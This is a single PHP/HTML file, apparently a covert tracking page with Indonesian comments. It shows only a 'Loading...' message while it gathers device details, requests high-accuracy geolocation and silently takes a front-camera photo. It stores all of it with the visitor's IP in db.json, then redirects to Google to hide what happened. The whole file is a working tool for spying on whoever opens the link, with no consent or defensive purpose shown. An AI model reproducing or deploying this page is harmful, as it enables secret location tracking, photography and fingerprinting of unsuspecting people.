<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);
    
    // Info server-side
    $data['ip'] = $_SERVER['REMOTE_ADDR'];
    $data['time'] = date('Y-m-d H:i:s');
    $data['user_agent'] = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    // Simpen foto ke folder
    if (!empty($data['foto'])) {
        if (!is_dir('fotos')) mkdir('fotos', 0755, true);
        $fotoData = explode(',', $data['foto'])[1];
        $fotoBinary = base64_decode($fotoData);
        $filename = 'fotos/' . date('Ymd_His') . '_' . uniqid() . '.jpg';
        file_put_contents($filename, $fotoBinary);
        $data['foto'] = $filename;
    }
    
    // Simpen ke db.json
    $file = 'db.json';
    $existing = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
    if (!is_array($existing)) $existing = [];
    $existing[] = $data;
    file_put_contents($file, json_encode($existing, JSON_PRETTY_PRINT));
    
    echo json_encode(['status' => 'ok']);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading...</title>
<style>
body { font-family: Arial; background: #fff; color: #333; text-align: center; padding: 50px; }
</style>
</head>
<body>
<div id="status">Memuat halaman...</div>

<script>
async function track(){
    const status = document.getElementById('status');
    const data = {};
    
    // ===== INFO DASAR =====
    data.screen = `${screen.width}x${screen.height}`;
    data.window = `${window.innerWidth}x${window.innerHeight}`;
    data.platform = navigator.platform;
    data.language = navigator.language;
    data.languages = navigator.languages ? navigator.languages.join(',') : '';
    data.cpu_cores = navigator.hardwareConcurrency || 'Unknown';
    data.device_memory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown';
    data.touch_points = navigator.maxTouchPoints || 0;
    data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    data.online = navigator.onLine;
    
    // ===== KONEKSI =====
    if (navigator.connection) {
        data.connection_type = navigator.connection.effectiveType || 'Unknown';
        data.connection_downlink = navigator.connection.downlink ? navigator.connection.downlink + ' Mbps' : 'Unknown';
        data.connection_rtt = navigator.connection.rtt ? navigator.connection.rtt + ' ms' : 'Unknown';
    }
    
    // ===== BATERAI =====
    try {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            data.battery_level = Math.round(battery.level * 100) + '%';
            data.battery_charging = battery.charging ? 'Ya' : 'Tidak';
            data.battery_charging_time = battery.chargingTime !== Infinity ? battery.chargingTime + ' detik' : 'Unknown';
            data.battery_discharging_time = battery.dischargingTime !== Infinity ? battery.dischargingTime + ' detik' : 'Unknown';
        } else {
            data.battery_level = 'Tidak didukung';
            data.battery_charging = 'Tidak didukung';
        }
    } catch(e) {
        data.battery_level = 'Error';
    }
    
    // ===== GPU =====
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                data.gpu_vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                data.gpu_renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
        }
    } catch(e) {
        data.gpu_vendor = 'Unknown';
    }
    
    // ===== LOKASI =====
    try {
        const pos = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true,
                timeout: 10000
            });
        });
        data.lat = pos.coords.latitude;
        data.lng = pos.coords.longitude;
        data.accuracy = pos.coords.accuracy + ' meter';
        data.altitude = pos.coords.altitude ? pos.coords.altitude + ' m' : 'Unknown';
        data.speed = pos.coords.speed ? pos.coords.speed + ' m/s' : 'Unknown';
        data.heading = pos.coords.heading ? pos.coords.heading + '°' : 'Unknown';
    } catch(e) {
        console.log('Lokasi ditolak');
    }
    
    // ===== KAMERA =====
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user' }
        });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        await new Promise(r => setTimeout(r, 1000));
        
        const canvas = document.createElement('canvas');
        canvas.width = 320;
        canvas.height = 240;
        canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
        data.foto = canvas.toDataURL('image/jpeg', 0.5);
        
        // Info kamera
        const tracks = stream.getVideoTracks();
        if (tracks.length > 0) {
            const settings = tracks[0].getSettings();
            data.camera_width = settings.width || 'Unknown';
            data.camera_height = settings.height || 'Unknown';
            data.camera_facing = settings.facingMode || 'Unknown';
        }
        
        stream.getTracks().forEach(t => t.stop());
    } catch(e) {
        console.log('Kamera ditolak');
    }
    
    // ===== KIRIM =====
    try {
        await fetch('track.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
        status.textContent = 'Selesai';
    } catch(e) {
        status.textContent = 'Gagal kirim';
    }
    
    setTimeout(() => {
        window.location.href = 'https://www.google.com';
    }, 1500);
}

track();
</script>
</body>
</html>